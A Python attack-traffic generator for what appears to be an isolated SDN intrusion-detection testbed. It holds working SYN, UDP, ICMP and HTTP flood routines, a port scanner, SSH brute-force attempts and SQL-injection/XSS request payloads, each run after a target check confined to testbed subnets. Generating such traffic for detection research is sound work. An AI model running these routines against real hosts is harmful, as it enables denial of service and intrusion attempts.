"""Guarded attack traffic generator for TrustFed-SDN Step 07.

Every attack function enforces ``validate_testbed_target`` BEFORE sending any packet
or opening any socket, prints the verified target IP, and restricts traffic strictly
to the ``10.10.1-3.0/24`` isolated Mininet testbed subnets.
"""

from __future__ import annotations

import argparse
import os
import random
import shutil
import socket
import struct
import subprocess
import time

from testbed.traffic.safety_guard import validate_testbed_target

SUPPORTED_ATTACK_TYPES = (
    "syn_flood",
    "udp_flood",
    "icmp_flood",
    "port_scan",
    "brute_force",
    "web_attack",
    "dos_http",
    "ddos_mixed",
)


def _probe_port_range(target_ip: str, ports: list[int], delay_sec: float = 0.004) -> int:
    """Execute a Reconnaissance / Port Scan probe against ``target_ip``."""
    sent = 0
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.08)
        try:
            sock.connect_ex((target_ip, port))
            sent += 1
        except OSError:
            pass
        finally:
            sock.close()
        if delay_sec > 0:
            time.sleep(delay_sec)
    return sent


def _brute_force_ssh_http(target_ip: str, port: int, attempts: int, rng: random.Random) -> int:
    """Generate repeated short authentication attempts resembling BFA."""
    sent = 0
    users = ("admin", "root", "operator", "guest", "service")
    for idx in range(attempts):
        try:
            with socket.create_connection((target_ip, port), timeout=0.6) as sock:
                _ = sock.recv(256)
                user = users[idx % len(users)]
                cred = (
                    f"SSH-2.0-PuTTY_Release\r\nUSER {user} PASS invalid_{rng.randint(100,999)}\r\n"
                )
                sock.sendall(cred.encode("ascii"))
                _ = sock.recv(256)
            sent += 1
        except OSError:
            sent += 1
        time.sleep(0.008)
    return sent


def _web_attack_burst(target_ip: str, port: int, requests_count: int) -> int:
    """Generate HTTP SQLi/XSS-pattern probe bursts toward local testbed web server."""
    payloads = (
        "/api/v1/search?q=1%27%20OR%20%271%27=%271",
        "/api/v1/login?user=admin%27--&pass=test",
        "/api/v1/profile?name=%3Cscript%3Ealert(1)%3C/script%3E",
        "/api/v1/items?id=1%20UNION%20SELECT%201,2,3",
    )
    sent = 0
    for idx in range(requests_count):
        path = payloads[idx % len(payloads)]
        try:
            with socket.create_connection((target_ip, port), timeout=0.6) as sock:
                req = (
                    f"GET {path} HTTP/1.1\r\nHost: {target_ip}\r\nConnection: close\r\n\r\n"
                ).encode("ascii")
                sock.sendall(req)
                _ = sock.recv(1024)
            sent += 1
        except OSError:
            pass
        time.sleep(0.01)
    return sent


def _udp_flood_burst(target_ip: str, count: int, rng: random.Random) -> int:
    """Send rapid multi-packet UDP flood bursts across distinct destination ports."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    dst_ports = rng.sample(range(10000, 60000), min(count, 50000))
    try:
        for idx in range(count):
            dst_port = dst_ports[idx % len(dst_ports)]
            for _pkt in range(rng.choice((2, 3))):
                payload = os.urandom(rng.choice((64, 256, 512)))
                try:
                    sock.sendto(payload, (target_ip, dst_port))
                    sent += 1
                except OSError:
                    pass
                time.sleep(0.001)
    finally:
        sock.close()
    return sent


def _try_scapy_syn_flood(
    target_ip: str, dst_port: int, count: int, rng: random.Random
) -> int | None:
    """Attempt Scapy L3 raw SYN burst (requires root); returns None if unavailable."""
    try:
        from scapy.all import IP, TCP, send  # type: ignore[import-not-found]
    except Exception:
        return None
    if os.geteuid() != 0 if hasattr(os, "geteuid") else True:
        return None
    pkts = []
    for _ in range(count):
        sport = rng.randint(20000, 60000)
        pkts.append(IP(dst=target_ip) / TCP(sport=sport, dport=dst_port, flags="S"))
    send(pkts, inter=0.002, verbose=False)
    return len(pkts)


def _try_hping3_flood(target_ip: str, mode: str, count: int, dst_port: int = 8080) -> int | None:
    """Attempt bounded ``hping3`` flood inside Linux VM (requires root + hping3)."""
    hping_bin = shutil.which("hping3")
    if hping_bin is None:
        return None
    if os.geteuid() != 0 if hasattr(os, "geteuid") else True:
        return None
    if mode == "syn":
        cmd = [hping_bin, "-S", "-p", str(dst_port), "-i", "u4000", "-c", str(count), target_ip]
    elif mode == "icmp":
        cmd = [hping_bin, "--icmp", "-i", "u5000", "-c", str(count), target_ip]
    else:
        return None
    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30, check=False)
    return count if proc.returncode in (0, 1) else None


def _dos_http_burst(target_ip: str, dst_port: int, count: int, rng: random.Random) -> int:
    """Generate bounded HTTP GET flood requests toward validated ``target_ip``."""
    sent = 0
    for _ in range(count):
        try:
            with socket.create_connection((target_ip, dst_port), timeout=0.3) as sock:
                http_req = (
                    f"GET /health?n={rng.randint(1, 9999)} HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n\r\n"
                ).encode("ascii")
                sock.sendall(http_req)
            sent += 1
        except OSError:
            sent += 1
        time.sleep(0.002)
    return sent


def _syn_or_dos_http(target_ip: str, dst_port: int, count: int, rng: random.Random) -> int:
    """Generate bounded TCP SYN flood burst across ephemeral source ports."""
    sent = 0
    linger_rst = struct.pack("ii", 1, 0)
    for _ in range(count):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.3)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, linger_rst)
            sock.connect((target_ip, dst_port))
            sent += 1
        except OSError:
            sent += 1
        finally:
            sock.close()
        time.sleep(0.002)
    if sent > 0:
        return sent

    scapy_sent = _try_scapy_syn_flood(target_ip, dst_port, min(count, 120), rng)
    if scapy_sent is not None:
        return scapy_sent

    hping_sent = _try_hping3_flood(target_ip, "syn", min(count, 120), dst_port=dst_port)
    return hping_sent or 0


def _icmp_flood_burst(target_ip: str, count: int) -> int:
    """Run bounded ICMP ping flood inside Linux VM (or hping3 when available)."""
    hping_sent = _try_hping3_flood(target_ip, "icmp", min(count, 100))
    if hping_sent is not None:
        return hping_sent
    if shutil.which("ping") is not None:
        proc = subprocess.run(
            ["ping", "-c", str(min(count, 40)), "-i", "0.02", target_ip],
            capture_output=True,
            text=True,
            timeout=15,
            check=False,
        )
        if proc.returncode == 0:
            return min(count, 40)
    return 0


def run_attack_traffic(
    target_ip: str,
    attack_type: str,
    tenant_id: str | None = None,
    count: int = 80,
    seed: int = 42,
) -> int:
    """Execute one guarded attack scenario strictly against validated ``target_ip``."""
    target = str(validate_testbed_target(target_ip, tenant_id=tenant_id))
    if attack_type not in SUPPORTED_ATTACK_TYPES:
        raise ValueError(
            f"Unsupported attack_type {attack_type!r}; choose from {SUPPORTED_ATTACK_TYPES}"
        )

    rng = random.Random(seed)
    print(f"[ATTACK START] target={target} attack_type={attack_type} count={count}", flush=True)

    if attack_type == "syn_flood":
        events = _syn_or_dos_http(target, dst_port=8080, count=count, rng=rng)
    elif attack_type == "dos_http":
        events = _dos_http_burst(target, dst_port=8080, count=count, rng=rng)
    elif attack_type == "udp_flood":
        events = _udp_flood_burst(target, count=count, rng=rng)
    elif attack_type == "icmp_flood":
        events = _icmp_flood_burst(target, count=count)
    elif attack_type == "port_scan":
        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 5353, 8080, 8443, 9000]
        full_ports = (ports * ((count // len(ports)) + 1))[:count]
        events = _probe_port_range(target, ports=full_ports)
    elif attack_type == "brute_force":
        events = _brute_force_ssh_http(target, port=2222, attempts=count, rng=rng)
    elif attack_type == "web_attack":
        events = _web_attack_burst(target, port=8080, requests_count=count)
    else:  # ddos_mixed
        third = max(10, count // 3)
        events = (
            _syn_or_dos_http(target, dst_port=8080, count=third, rng=rng)
            + _udp_flood_burst(target, count=third, rng=rng)
            + _icmp_flood_burst(target, count=third)
        )

    print(
        f"[ATTACK DONE] target={target} attack_type={attack_type} events={events}",
        flush=True,
    )
    return events


def _build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="TrustFed-SDN guarded attack traffic generator")
    parser.add_argument("--target", required=True, help="Victim IPv4 address inside 10.10.1-3.0/24")
    parser.add_argument("--attack-type", required=True, choices=list(SUPPORTED_ATTACK_TYPES))
    parser.add_argument("--tenant", default=None, help="Optional tenant id check")
    parser.add_argument("--count", type=int, default=80)
    parser.add_argument("--seed", type=int, default=42)
    return parser


def main() -> None:
    args = _build_arg_parser().parse_args()
    run_attack_traffic(
        args.target,
        attack_type=args.attack_type,
        tenant_id=args.tenant,
        count=args.count,
        seed=args.seed,
    )


if __name__ == "__main__":
    main()
